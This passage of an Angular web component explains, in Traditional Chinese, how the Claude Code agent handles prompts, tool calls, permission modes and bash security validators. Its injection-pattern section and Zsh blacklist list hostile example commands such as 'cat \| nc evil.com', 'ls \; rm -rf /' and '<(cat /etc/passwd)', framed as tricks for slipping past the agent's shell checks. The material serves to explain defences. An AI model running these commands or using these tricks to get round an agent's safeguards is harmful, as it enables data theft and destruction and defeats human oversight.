    .sv-level--medium { background: rgba(255,140,66,0.15); color: #ff8c42; border: 1px solid rgba(255,140,66,0.3); }
    .sv-level--low    { background: rgba(255,209,102,0.12); color: #ffd166; border: 1px solid rgba(255,209,102,0.25); }

    .bl-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 10px; }
    .bl-desc { color: var(--text-secondary); font-size: 0.875rem; margin-bottom: 20px; }
    .bl-grid {
      display: grid; grid-template-columns: repeat(auto-fill, minmax(260px,1fr)); gap: 10px; margin-bottom: 48px;
    }
    .bl-item {
      display: flex; gap: 12px; align-items: flex-start; background: rgba(255,77,109,0.06);
      border: 1px solid rgba(255,77,109,0.2); border-radius: 8px; padding: 12px;
    }
    .bl-cmd { font-size: 0.82rem; color: #ff4d6d; min-width: 100px; }
    .bl-reason { font-size: 0.78rem; color: var(--text-secondary); line-height: 1.4; }

    .inj-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 20px; }
    .inj-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 16px; }
    .inj-card {
      background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; padding: 20px;
    }
    .inj-header { display: flex; align-items: center; gap: 10px; margin-bottom: 10px;
      .inj-icon { font-size: 1.5rem; }
      h4 { font-size: 0.95rem; font-weight: 700; margin: 0; }
    }
    .inj-card p { color: var(--text-secondary); font-size: 0.82rem; margin-bottom: 10px; line-height: 1.5; }
    .inj-examples { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 10px;
      code { font-size: 0.75rem; background: rgba(255,77,109,0.1); border: 1px solid rgba(255,77,109,0.25); color: #ff8888; padding: 2px 8px; border-radius: 4px; }
    }
    .inj-why { font-size: 0.75rem; color: #ff8c42; background: rgba(255,140,66,0.08); border: 1px solid rgba(255,140,66,0.2); border-radius: 6px; padding: 6px 10px; }

    /* ─── AUTO MODE ─── */
    .pm-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 20px; }
    .pm-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(260px,1fr)); gap: 16px; margin-bottom: 48px; }
    .pm-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; overflow: hidden; }
    .pm-header {
      display: flex; gap: 14px; align-items: center; padding: 16px 20px; border-bottom: 1px solid rgba(255,255,255,0.06);
      .pm-icon { font-size: 1.8rem; }
      h4 { font-size: 0.95rem; font-weight: 700; margin: 0 0 2px; }
      code { font-size: 0.72rem; color: var(--text-secondary); }
    }
    .pm-header--green  { background: rgba(0,212,170,0.08); }
    .pm-header--yellow { background: rgba(255,209,102,0.08); }
    .pm-header--blue   { background: rgba(92,138,255,0.08); }
    .pm-header--red    { background: rgba(255,77,109,0.08); }
    .pm-card p { font-size: 0.82rem; color: var(--text-secondary); padding: 14px 20px 10px; line-height: 1.5; }
    .pm-allowed { padding: 0 20px 14px; display: flex; flex-direction: column; gap: 6px; }
    .pm-allow-item { display: flex; align-items: baseline; gap: 8px; font-size: 0.78rem; color: var(--text-secondary); }
    .pa-dot { width: 6px; height: 6px; border-radius: 50%; display: inline-block; min-width: 6px; margin-bottom: 1px; }
    .pa-dot--allow { background: #00d4aa; }
    .pa-dot--ask   { background: #ffd166; }
    .pa-dot--deny  { background: #ff4d6d; }
    .pm-warning { margin: 0 20px 16px; font-size: 0.75rem; color: #ff8c42; background: rgba(255,140,66,0.08); border: 1px solid rgba(255,140,66,0.2); border-radius: 6px; padding: 6px 10px; }

    .cls-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 10px; }
    .cls-desc { color: var(--text-secondary); font-size: 0.875rem; margin-bottom: 28px; }
    .cls-flow { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; margin-bottom: 48px; }
    .cs-card {
      background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px;
      padding: 18px; text-align: center; min-width: 150px; flex: 1;
      .cs-num { font-size: 0.7rem; color: var(--text-secondary); margin-bottom: 6px; font-family: monospace; }
      .cs-icon { font-size: 1.8rem; margin-bottom: 8px; }
      h4 { font-size: 0.9rem; font-weight: 700; margin-bottom: 6px; }
      p { font-size: 0.78rem; color: var(--text-secondary); line-height: 1.4; margin-bottom: 8px; }
      code { font-size: 0.7rem; color: #00d4aa; background: rgba(0,212,170,0.08); padding: 2px 8px; border-radius: 4px; display: block; }
    }
    .cs-card--blue   { border-top: 2px solid #5c8aff; }
    .cs-card--purple { border-top: 2px solid #7c5cfc; }
    .cs-card--teal   { border-top: 2px solid #00d4aa; }
    .cs-card--yellow { border-top: 2px solid #ffd166; }
    .cs-card--green  { border-top: 2px solid #00d4aa; }
    .cs-card--red    { border-top: 2px solid #ff4d6d; }
    .cs-arrow { font-size: 1.5rem; color: var(--text-secondary); }

    .env-title { font-size: 1.1rem; font-weight: 700; margin-bottom: 10px; }
    .env-desc { color: var(--text-secondary); font-size: 0.875rem; margin-bottom: 20px; }
    .env-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(220px,1fr)); gap: 16px; }
    .env-group { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 10px; padding: 16px; }
    .eg-label { font-size: 0.75rem; font-weight: 700; color: #7c5cfc; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.05em; }
    .eg-vars { display: flex; flex-wrap: wrap; gap: 6px;
      code { font-size: 0.72rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 2px 7px; border-radius: 4px; color: #00d4aa; }
    }

    /* ─── CONCURRENCY ─── */
    .conc-layout { display: grid; grid-template-columns: 1fr auto 1fr; gap: 24px; align-items: center; }
    .conc-vs { font-size: 1.3rem; font-weight: 800; color: var(--text-secondary); text-align: center; }
    .conc-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 14px; padding: 28px; }
    .conc-card--concurrent { border-top: 3px solid #00d4aa; }
    .conc-card--serial     { border-top: 3px solid #ff8c42; }
    .cc-header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; }
    .cc-badge { font-size: 0.78rem; font-weight: 700; padding: 4px 12px; border-radius: 12px; }
    .cc-badge--green  { background: rgba(0,212,170,0.15); color: #00d4aa; border: 1px solid rgba(0,212,170,0.3); }
    .cc-badge--orange { background: rgba(255,140,66,0.15); color: #ff8c42; border: 1px solid rgba(255,140,66,0.3); }
    .cc-count { font-size: 0.75rem; color: var(--text-secondary); }
    .cc-icon-row { font-size: 1.5rem; margin: 12px 0; }
    .conc-card p { color: var(--text-secondary); font-size: 0.85rem; line-height: 1.6; margin-bottom: 16px; }
    .cc-tools { display: flex; flex-direction: column; gap: 8px; }
    .cc-tool { display: flex; align-items: baseline; gap: 10px;
      code { font-size: 0.78rem; background: rgba(255,255,255,0.06); border: 1px solid rgba(255,255,255,0.1); padding: 2px 8px; border-radius: 4px; color: var(--text-primary); min-width: 80px; }
      span { font-size: 0.78rem; color: var(--text-secondary); }
    }

    /* ─── RECOVERY ─── */
    .recovery-cards { display: grid; grid-template-columns: repeat(auto-fill, minmax(340px,1fr)); gap: 20px; }
    .rec-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 14px; padding: 24px; }
    .rec-header { display: flex; gap: 16px; align-items: flex-start; margin-bottom: 20px;
      .rec-icon { font-size: 2rem; }
      h4 { font-size: 1rem; font-weight: 700; margin-bottom: 4px; }
      .rec-trigger { font-size: 0.75rem; color: var(--text-secondary); }
    }
    .rec-steps { display: flex; flex-direction: column; gap: 10px; margin-bottom: 16px; }
    .rs-step { display: flex; gap: 12px; align-items: flex-start; }
    .rs-num {
      width: 22px; height: 22px; border-radius: 50%; background: rgba(124,92,252,0.2); color: #a78fff;
      display: flex; align-items: center; justify-content: center; font-size: 0.7rem; font-weight: 800; min-width: 22px;
    }
    .rs-body { font-size: 0.82rem; line-height: 1.5;
      strong { color: var(--text-primary); display: block; }
      span { color: var(--text-secondary); }
    }
    .rec-fallback { font-size: 0.75rem; color: #ff4d6d; background: rgba(255,77,109,0.08); border: 1px solid rgba(255,77,109,0.2); border-radius: 6px; padding: 8px 12px; }

    /* ─── DECISIONS ─── */
    .decisions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px,1fr)); gap: 16px; }
    .dec-card { background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 12px; padding: 22px; }
    .dec-q { display: flex; gap: 12px; align-items: flex-start; margin-bottom: 16px;
      .dec-qicon { font-size: 1.5rem; min-width: 28px; }
      h4 { font-size: 0.9rem; font-weight: 700; line-height: 1.4; margin: 0; }
    }
    .dec-branches { display: flex; flex-direction: column; gap: 8px; margin-bottom: 14px; }
    .dec-branch { display: flex; gap: 10px; padding: 8px 12px; border-radius: 8px; font-size: 0.8rem; align-items: flex-start;
      .db-label { font-weight: 700; min-width: 32px; font-size: 0.75rem; }
    }
    .dec-branch--yes { background: rgba(0,212,170,0.08); border: 1px solid rgba(0,212,170,0.2); color: #b8e8d8;
      .db-label { color: #00d4aa; }
    }
    .dec-branch--no  { background: rgba(255,77,109,0.08); border: 1px solid rgba(255,77,109,0.2); color: #e8b8c0;
      .db-label { color: #ff4d6d; }
    }
    .dec-ref { display: block; font-size: 0.7rem; color: var(--text-secondary); font-family: monospace; }

    /* ─── PERF ─── */
    .perf-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(240px,1fr)); gap: 20px; }
    .perf-card {
      background: var(--bg-secondary); border: 1px solid var(--border-color); border-radius: 14px; padding: 24px;
      transition: transform .2s; &:hover { transform: translateY(-3px); }
      .pc-icon { font-size: 2rem; margin-bottom: 12px; }
      h4 { font-size: 1rem; font-weight: 700; margin-bottom: 8px; }
      p { color: var(--text-secondary); font-size: 0.85rem; line-height: 1.5; margin-bottom: 12px; }
    }
    .pc-saving { font-size: 0.78rem; color: #00d4aa; background: rgba(0,212,170,0.08); border: 1px solid rgba(0,212,170,0.2); border-radius: 6px; padding: 6px 12px; }

    /* ─── RESPONSIVE ─── */
    @media (max-width: 900px) {
      .react-cols { grid-template-columns: 1fr; }
      .conc-layout { grid-template-columns: 1fr; .conc-vs { display: none; } }
    }
    @media (max-width: 768px) {
      .cls-flow { flex-direction: column; .cs-arrow { transform: rotate(90deg); } }
    }
  `]
})
export class FlowComponent {

  analogies = [
    {
      icon: '🤔',
      title: '思考再行動（ReAct）',
      analogy: '就像偵探會先「推理」再「行動」——Claude 先思考需要什麼資訊，再去查找，不斷循環直到解決問題。',
      tech: 'query.ts 的 while(true) 循環，不斷重複 Reason→Act→Observe 直到 stop_reason = end_turn'
    },
    {
      icon: '🛡️',
      title: '嚴格的安保檢查',
      analogy: '就像機場安檢——每次要執行指令，都會通過 23 道安全閘門，任何可疑模式都會被攔截。',
      tech: 'bashSecurity.ts 中 23 個驗證器，包含黑名單、注入偵測、混淆識別等'
    },
    {
      icon: '📋',
      title: '工作清單與授權',
      analogy: '就像員工需要主管授權——Claude 每次要操作系統，都需要確認有執行該操作的權限。',
      tech: 'ToolPermissionContext 管理 allow/deny/ask 三種決策，配合 auto mode ML 分類器'
    },
    {
      icon: '🔀',
      title: '聰明的任務分配',
      analogy: '就像同時派多位偵探查不同線索——唯讀操作可以同時進行，而修改文件則要一個一個來，避免衝突。',
      tech: 'partitionToolCalls() 將工具分為並發（讀）和串行（寫），最多 10 個並發'
    },
    {
      icon: '🗜️',
      title: '自動整理記憶',
      analogy: '就像人的短期記憶有限——對話太長時，Claude 會自動把舊內容壓縮成摘要，騰出空間繼續工作。',
      tech: 'maybeAutoCompact() 偵測 Context 使用量，自動觸發 compaction 壓縮舊訊息'
    },
    {
      icon: '💨',
      title: '即時顯示回應',
      analogy: '就像直播而非錄播——Claude 的文字一字一字傳到你的畫面，不必等全部寫完才看到。',
      tech: 'SSE（Server-Sent Events）串流，每個 token 到達即透過 Ink 渲染至終端機'
    },
  ];

  reactReason = [
    { code: 'buildMessages()', desc: '組裝對話歷史 + 上下文' },
    { code: 'systemPrompt', desc: '注入工具說明 + 規則' },
    { code: 'tool_use block', desc: '決定呼叫哪個工具' },
    { code: 'end_turn', desc: '直接回答，不需工具' },
  ];

  reactAct = [
    { code: 'canUseTool()', desc: '安全與權限檢查' },
    { code: 'tool.call()', desc: '執行實際操作' },
    { code: 'bashSecurity', desc: '23 項安全驗證' },
    { code: 'concurrent/serial', desc: '並發或串行執行' },
  ];

  reactObserve = [
    { code: 'tool_result', desc: '工具輸出加入對話' },
    { code: 'needsFollowUp', desc: '是否需繼續循環' },
    { code: 'turnCount++', desc: '回合計數增加' },
    { code: 'stop_reason', desc: 'tool_use→繼續 | end_turn→結束' },
  ];

  pipelineSteps = [
    {
      num: '①', icon: '⌨️', color: 'purple', layer: 'USER LAYER',
      title: '使用者輸入',
      simple: '您在終端機輸入問題，按下 Enter。',
      detail: 'PromptInput 元件捕捉鍵盤輸入，支援多行文字、檔案引用（@file）、貼上附件。輸入內容被封裝為 UserMessage 物件。',
      files: ['src/screens/REPL.tsx', 'src/components/PromptInput/'],
      facts: [
        { icon: '📎', text: '支援 @file 展開檔案內容' },
        { icon: '🖼️', text: '支援圖片/截圖貼上' },
      ]
    },
    {
      num: '②', icon: '🔧', color: 'purple', layer: 'USER LAYER',
      title: '輸入解析與上下文組裝',
      simple: '系統收集環境資訊，組合出完整的問題背景。',
      detail: 'handlePromptSubmit() 解析輸入，同時 getSystemContext() 執行 git status、取得當前分支、讀取 CLAUDE.md 設定，組裝包含工具說明的 System Prompt。此過程已記憶化，同一 session 不重複執行。',
      files: ['src/utils/handlePromptSubmit.ts', 'src/context.ts', 'src/utils/claudemd.ts', 'src/constants/prompts.ts'],
      facts: [
        { icon: '📁', text: 'CLAUDE.md 向上遞迴搜尋' },
        { icon: '⚡', text: 'git 資訊已快取，不重複查詢' },
        { icon: '🛠️', text: '30+ 種工具說明注入 System Prompt' },
      ]
    },
    {
      num: '③', icon: '🧠', color: 'blue', layer: 'ENGINE LAYER',
      title: 'QueryEngine：管理對話狀態',
      simple: 'Claude 的「大腦管家」，負責記錄整個對話過程。',
      detail: 'QueryEngine.query() 是最高層的協調者，管理完整對話歷史、file history 快照、attribution 追蹤。normalizeMessagesForAPI() 整理訊息格式，並標記 cache_control: ephemeral 以節省費用。若對話太長，自動觸發 compaction。',
      files: ['src/QueryEngine.ts', 'src/query.ts', 'src/utils/api.ts'],
      facts: [
        { icon: '📏', text: 'Token 使用量即時追蹤' },
        { icon: '🗜️', text: '超出上限自動壓縮摘要' },
        { icon: '💵', text: 'cache_control 減少重複費用' },
      ]
    },
    {
      num: '④', icon: '📡', color: 'teal', layer: 'API LAYER',
      title: 'Anthropic API 串流呼叫',
      simple: '將整理好的問題傳送給 Claude，開始接收回應。',
      detail: '呼叫 Anthropic SDK 的 beta.messages.stream()，傳送 model、messages、system prompt、tools 清單與 betas 功能旗標。使用 SSE 串流接收，每個 token 即時傳回顯示。',
      files: ['src/services/api/claude.ts'],
      facts: [
        { icon: '🔄', text: 'SSE 串流，不等全部完成才顯示' },
        { icon: '🧠', text: '支援 Thinking 延伸推理模式' },
        { icon: '☁️', text: '支援 AWS Bedrock / Google Vertex' },
      ]
    },
    {
      num: '⑤', icon: '🔍', color: 'teal', layer: 'API LAYER',
      title: '串流事件處理 · 工具偵測',
      simple: 'Claude 的回應一邊流入，系統一邊解析是否需要執行工具。',
      detail: '在 query.ts 的事件迴圈中處理每個 StreamEvent：content_block_delta 累積文字顯示給使用者，若出現 tool_use block 則設定 needsFollowUp=true，觸發後續工具執行。某些錯誤（如 prompt_too_long）會被暫時隱藏以嘗試自動恢復。',
      files: ['src/query.ts'],
      facts: [
        { icon: '👁️', text: '即時渲染文字 token' },
        { icon: '🔧', text: '偵測 tool_use 區塊' },
        { icon: '🩹', text: '錯誤暫時隱藏以嘗試恢復' },
      ]
    },
    {
      num: '⑥', icon: '🛡️', color: 'yellow', layer: 'SECURITY LAYER',
      title: '安全驗證 · 權限確認',
      simple: '每次要執行工具前，先檢查安全性和使用者授權。',
      detail: 'canUseTool() 先通過 23 項安全驗證（bashSecurity.ts），再查詢 ToolPermissionContext 決定 allow/deny/ask。auto 模式下，ML 分類器在 2 秒內自動決策。需要確認時顯示互動對話框。',
      files: ['src/tools/BashTool/bashSecurity.ts', 'src/hooks/useCanUseTool.tsx', 'src/Tool.ts'],
      facts: [
        { icon: '🚫', text: '23 項安全驗證器' },
        { icon: '🤖', text: 'ML 分類器 2 秒自動決策' },
        { icon: '🗂️', text: 'Zsh 危險指令黑名單' },
      ]
    },
    {
      num: '⑦', icon: '⚡', color: 'orange', layer: 'TOOL LAYER',
      title: '工具執行 · 並發策略',
      simple: 'Claude 實際操作您的系統：讀檔、執行命令、搜尋程式碼...',
      detail: 'partitionToolCalls() 將工具分批：唯讀工具（Read/Grep/Glob）最多 10 個同時執行，寫入工具（Edit/Write/Bash）嚴格串行。執行結果作為 tool_result 訊息加入對話歷史，ReAct 循環繼續。',
      files: ['src/services/tools/toolOrchestration.ts', 'src/tools/'],
      facts: [
        { icon: '🔀', text: '唯讀工具最多 10 個並發' },
        { icon: '🔒', text: '寫入工具嚴格串行' },
        { icon: '🔄', text: '結果加入對話，繼續 ReAct 循環' },
      ]
    },
    {
      num: '⑧', icon: '✅', color: 'red', layer: 'DISPLAY LAYER',
      title: '顯示結果 · 持久化 Session',
      simple: '最終回應顯示在畫面，費用統計，對話存檔備用。',
      detail: '當 stop_reason = "end_turn"，退出 ReAct 循環。REPL.tsx 渲染完整對話，顯示 Token 用量與費用。recordTranscript() 將對話儲存到 ~/.claude/projects/<hash>/session-*.jsonl，下次可恢復。',
      files: ['src/screens/REPL.tsx', 'src/cost-tracker.ts'],
      facts: [
        { icon: '💵', text: 'Token 計數與費用顯示' },
        { icon: '💾', text: 'JSONL 格式儲存於本機' },
        { icon: '🔄', text: '下次可用 --resume 恢復' },
      ]
    },
  ];

  securityValidators = [
    { id: 1,  name: 'INCOMPLETE_COMMANDS',          desc: '偵測以 Tab 開頭、前導旗標、繼續運算符等不完整指令',            level: 'medium', levelLabel: '中' },
    { id: 2,  name: 'JQ_SYSTEM_FUNCTION',           desc: '阻止 jq 內執行系統函數（env、path、builtins 等）',             level: 'high',   levelLabel: '高' },
    { id: 3,  name: 'JQ_FILE_ARGUMENTS',            desc: '阻止 jq 讀取任意路徑檔案（-f flag 濫用）',                      level: 'high',   levelLabel: '高' },
    { id: 4,  name: 'OBFUSCATED_FLAGS',             desc: '偵測混淆旗標，如使用 Base64 或編碼繞過白名單',                  level: 'high',   levelLabel: '高' },
    { id: 5,  name: 'SHELL_METACHARACTERS',         desc: '偵測 Shell 元字符（; & | ` 等）用於鏈接額外指令',              level: 'high',   levelLabel: '高' },
    { id: 6,  name: 'DANGEROUS_VARIABLES',          desc: '偵測危險環境變數注入（PATH、LD_PRELOAD、IFS 等）',              level: 'high',   levelLabel: '高' },
    { id: 7,  name: 'NEWLINES',                     desc: '偵測換行字符注入，藏匿額外指令於第二行',                        level: 'high',   levelLabel: '高' },
    { id: 8,  name: 'DANGEROUS_CMD_SUBSTITUTION',   desc: '偵測指令替換 $(...) 用於執行任意子指令',                        level: 'high',   levelLabel: '高' },
    { id: 9,  name: 'DANGEROUS_INPUT_REDIRECT',     desc: '偵測輸入重定向 < 讀取任意檔案',                                level: 'medium', levelLabel: '中' },
    { id: 10, name: 'DANGEROUS_OUTPUT_REDIRECT',    desc: '偵測輸出重定向 > 覆寫任意檔案',                                level: 'medium', levelLabel: '中' },
    { id: 11, name: 'IFS_INJECTION',                desc: '偵測 IFS（內部欄位分隔符）注入，分裂指令結構',                  level: 'high',   levelLabel: '高' },
    { id: 12, name: 'GIT_COMMIT_SUBSTITUTION',      desc: '阻止在 git commit 中注入 $(...) 執行任意程式',                 level: 'high',   levelLabel: '高' },
    { id: 13, name: 'PROC_ENVIRON_ACCESS',          desc: '阻止讀取 /proc/*/environ 竊取其他行程的環境變數',               level: 'high',   levelLabel: '高' },
    { id: 14, name: 'MALFORMED_TOKEN_INJECTION',    desc: '偵測畸形 Token 注入，利用解析器邊界情況',                      level: 'high',   levelLabel: '高' },
    { id: 15, name: 'BACKSLASH_ESCAPED_WHITESPACE', desc: '偵測反斜線空白符混淆，隱藏指令結構',                           level: 'medium', levelLabel: '中' },
    { id: 16, name: 'BRACE_EXPANSION',              desc: '三層花括號展開攻擊偵測（不匹配數量/引號/展開模式）',            level: 'high',   levelLabel: '高' },
    { id: 17, name: 'CONTROL_CHARACTERS',           desc: '偵測非列印控制字符（\x00-\x1F 等）隱藏在指令中',               level: 'high',   levelLabel: '高' },
    { id: 18, name: 'UNICODE_WHITESPACE',           desc: '偵測 Unicode 空白字符偽裝成普通空格繞過解析',                  level: 'medium', levelLabel: '中' },
    { id: 19, name: 'MID_WORD_HASH',               desc: '偵測詞中插入 # 符號截斷後續指令為注解',                        level: 'low',    levelLabel: '低' },
    { id: 20, name: 'ZSH_DANGEROUS_COMMANDS',      desc: '直接黑名單：zmodload/sysopen/zpty/ztcp 等 Zsh 危險內建指令',   level: 'high',   levelLabel: '高' },
    { id: 21, name: 'BACKSLASH_ESCAPED_OPERATORS', desc: '偵測 \\; \\| \\& \\< \\> 等反斜線轉義運算符混淆',              level: 'high',   levelLabel: '高' },
    { id: 22, name: 'COMMENT_QUOTE_DESYNC',        desc: '偵測引號與注解的不同步，利用解析器狀態機差異',                  level: 'medium', levelLabel: '中' },
    { id: 23, name: 'QUOTED_NEWLINE',              desc: '偵測引號內的換行符，可能在某些 Shell 中執行多行注入',           level: 'medium', levelLabel: '中' },
  ];

  blacklistItems = [
    { cmd: 'zmodload',       reason: '載入危險模組（mapfile、zpty、ztcp 等），是所有 Zsh 攻擊的入口' },
    { cmd: 'sysopen',        reason: '原始檔案描述符操作，可直接存取任意系統檔案' },
    { cmd: 'sysread',        reason: '原始 I/O 讀取，繞過 Shell 層面的存取控制' },
    { cmd: 'syswrite',       reason: '原始 I/O 寫入，可寫入任意系統位置' },
    { cmd: 'zpty',           reason: '建立偽終端，在隱藏的 pty 中執行任意指令' },
    { cmd: 'ztcp / zsocket', reason: '直接網路連線，可用於資料外洩' },
    { cmd: 'emulate -c',     reason: '等同 eval，切換 Shell 模式後執行任意程式' },
    { cmd: 'fc -e',          reason: '以任意編輯器執行歷史指令，等同任意程式執行' },
    { cmd: 'zf_rm / zf_mv…', reason: 'zfile 模組的檔案操作，繞過前綴規則直接操作任意路徑' },
  ];

  injectionPatterns = [
    {
      icon: '🔄',
      title: '行程替換（Process Substitution）',
      desc: '允許將指令輸出當作「虛擬檔案」傳入另一個指令，常被用來繞過輸入限制。',
      examples: ['<(cat /etc/passwd)', '>(tee /tmp/leak)', '=(cmd)'],
      why: '外表像檔案路徑，但實際上執行了另一個指令，可繞過基於路徑的安全規則'
    },
    {
      icon: '🌀',
      title: '花括號展開攻擊（Brace Expansion）',
      desc: '利用 Shell 的花括號展開功能，將看似無害的字串展開成危險指令。系統使用三層防護偵測。',
      examples: ["git diff {'{0}',--output=/tmp/leak}", "{a..z}", "{'a','b','c'}"],
      why: '展開後的指令與原始字串完全不同，可以偷渡任意旗標或路徑'
    },
    {
      icon: '🎭',
      title: '反斜線混淆（Backslash Obfuscation）',
      desc: '使用反斜線轉義 Shell 運算符，讓指令解析器看到的內容與人眼看到的不同。',
      examples: ['ls \\; rm -rf /', 'cat \\| nc evil.com', 'cmd \\& backdoor'],
      why: '某些解析器在計算前綴規則時不考慮反斜線，造成規則失效'
    },
    {
      icon: '👻',
      title: '控制字符注入（Control Characters）',
      desc: '在指令中插入不可見的控制字符（如 \\x00 null byte），讓日誌和顯示看起來正常，但執行不同的操作。',
      examples: ['cmd\\x00inject', 'ls\\x1binjection', 'cat\\x08extra'],
      why: '人眼和日誌工具看不到這些字符，而 Shell 可能以特殊方式處理'
    },
    {
      icon: '🌍',
      title: 'Unicode 空白偽裝',
      desc: '使用 Unicode 空白字符（U+00A0 不換行空格、U+2003 全形空格等）偽裝成普通空格，欺騙解析器。',
      examples: ['cmd\u00a0--dangerous', 'ls\u2003/etc/passwd'],
      why: '前綴提取邏輯可能用普通空格分割，但 Shell 接受 Unicode 空白作為分隔符'
    },
    {
      icon: '🔑',
      title: 'IFS 環境變數注入',
      desc: '修改 IFS（Internal Field Separator）改變 Shell 的字串分割方式，使指令解析結果完全不同。',
      examples: ['IFS=/ cmd /etc/passwd', "IFS=$'\\n' read"],
      why: 'Shell 用 IFS 分割指令參數，改變 IFS 可以讓同一字串被解析為完全不同的指令'
    },
  ];

  permModes = [
    {
      icon: '✅', name: 'Default 模式', code: 'default', color: 'green',
      desc: '標準模式。系統根據操作類型和設定規則決定是否需要詢問使用者。大多數唯讀操作自動通過，寫入操作視規則而定。',
      allowed: [
        { type: 'allow', text: '唯讀操作（Read/Grep/Glob）自動允許' },
        { type: 'ask',   text: '寫入/執行操作：視設定規則詢問' },
        { type: 'deny',  text: '危險操作或黑名單指令拒絕' },
      ],
      warning: null
    },
    {
      icon: '📝', name: 'AcceptEdits 模式', code: 'acceptEdits', color: 'yellow',
      desc: '自動接受所有檔案系統操作，包括 mkdir、rm、mv、cp、sed 等，無需每次確認。適合信任的自動化場景。',
      allowed: [
        { type: 'allow', text: 'mkdir / touch / rm / rmdir 自動通過' },
        { type: 'allow', text: 'mv / cp / sed 自動通過' },
        { type: 'ask',   text: '其他寫入操作視情況詢問' },
      ],
      warning: null
    },
    {
      icon: '🔕', name: 'DontAsk 模式', code: 'dontAsk', color: 'blue',
      desc: '用於 SDK / Agent 嵌入場景，不顯示互動對話框。Claude 自主決策，適合程式驅動的自動化流程。',
      allowed: [
        { type: 'allow', text: '大多數操作自動允許' },
        { type: 'allow', text: '不顯示確認 UI 對話框' },
        { type: 'ask',   text: '仍受安全驗證規則約束' },
      ],
      warning: null
    },
    {
      icon: '⚠️', name: 'BypassPermissions 模式', code: 'bypassPermissions', color: 'red',
      desc: '危險模式：跳過所有權限檢查，Claude 可執行任何操作。僅用於完全受控的環境，不建議一般使用。',
      allowed: [
        { type: 'allow', text: '所有操作均自動允許' },
        { type: 'allow', text: '不進行任何權限確認' },
        { type: 'deny',  text: '仍受 OS 層面權限限制' },
      ],
      warning: '危險：不建議在生產環境使用，可能導致不可逆的系統變更'
    },
  ];

  classifierSteps = [
    {
      num: 'STEP 1', icon: '🔧', title: '工具呼叫請求', color: 'blue',
      desc: 'Claude 決定呼叫某個工具，觸發 canUseTool() 函式進行決策',
      code: 'canUseTool(tool, input, ctx)'
    },
    {
      num: 'STEP 2', icon: '📋', title: '設定規則查詢', color: 'purple',
      desc: '先查詢使用者設定的允許/拒絕規則，若規則明確匹配則直接決定',
      code: 'toolPermissionContext.rules'
    },
    {
      num: 'STEP 3', icon: '🤖', title: 'ML 分類器競速', color: 'teal',
      desc: 'auto 模式下，ML 分類器與 2 秒計時器同時啟動，高信心結果直接通過',
      code: 'Promise.race([classifier, timeout(2000)])'
    },
    {
      num: 'STEP 4', icon: '⏳', title: '等待使用者', color: 'yellow',
      desc: '若分類器超時或信心不足，顯示互動確認對話框，等待使用者決定',
      code: 'PermissionRequest dialog'
    },
    {
      num: 'STEP 5', icon: '✅', title: '執行或拒絕', color: 'green',
      desc: '根據決策結果執行工具，或記錄拒絕原因並通知使用者',
      code: 'allow → execute | deny → notify'
    },
  ];

  safeEnvGroups = [
    { label: '建構工具', vars: ['GOEXPERIMENT', 'GOOS', 'GOARCH', 'CGO_ENABLED', 'GO111MODULE'] },
    { label: 'Node / Python', vars: ['NODE_ENV', 'PYTHONUNBUFFERED', 'PYTHONDONTWRITEBYTECODE'] },
    { label: '日誌除錯', vars: ['RUST_BACKTRACE', 'RUST_LOG', 'DEBUG'] },
    { label: '終端顯示', vars: ['TERM', 'COLORTERM', 'NO_COLOR', 'LS_COLORS', 'GREP_COLORS'] },
    { label: '語言時區', vars: ['LANG', 'CHARSET', 'TZ', 'LC_ALL'] },
    { label: 'API 金鑰', vars: ['ANTHROPIC_API_KEY'] },
  ];

  concurrentTools = [
    { name: 'Read', desc: '讀取檔案內容' },
    { name: 'Grep', desc: '搜尋字串/正則' },
    { name: 'Glob', desc: '搜尋檔案路徑' },
    { name: 'WebFetch', desc: '抓取網頁內容' },
    { name: 'WebSearch', desc: '搜尋引擎查詢' },
  ];

  serialTools = [
    { name: 'Edit', desc: '修改檔案內容' },
    { name: 'Write', desc: '建立/覆寫檔案' },
    { name: 'Bash', desc: '執行 Shell 指令' },
    { name: 'NotebookEdit', desc: '修改 Jupyter 格' },
  ];

  recoveryItems = [
    {
      icon: '📏',
      title: 'Prompt Too Long（PTL）恢復',
      trigger: 'API 回報訊息超過 Context 長度上限',
      steps: [
        { name: '階段 1：Context Collapse', desc: '套用暫存的訊息折疊，移除重複或冗餘的 tool_result，最省成本' },
        { name: '階段 2：Reactive Compact', desc: '呼叫 Claude 將整個對話歷史壓縮為摘要邊界，大幅減少 Token 數' },
        { name: '重新嘗試', desc: '以壓縮後的對話重新呼叫 API' },
      ],
      fallback: '恢復次數耗盡後，將錯誤顯示給使用者'
    },
    {
      icon: '📤',
      title: 'Max Output Tokens 恢復',
      trigger: 'Claude 回應被截斷（超過 max_output_tokens）',
      steps: [
        { name: '階段 1：Token 升級', desc: '將 max_output_tokens 從預設升至 64k，要求完整回應' },
        { name: '階段 2：多回合繼續', desc: '發送「請繼續」提示，讓 Claude 從截斷處繼續輸出（最多 3 次）' },
        { name: '合併結果', desc: '將多個部分合併為完整回應' },
      ],
      fallback: '超過 3 次後顯示截斷警告'
    },
    {
      icon: '🗜️',
      title: '自動壓縮（AutoCompact）',
      trigger: 'Token 使用量超過自動壓縮閾值',
      steps: [
        { name: '計算使用量', desc: '追蹤 taskBudget.remaining，若低於閾值則預先觸發' },
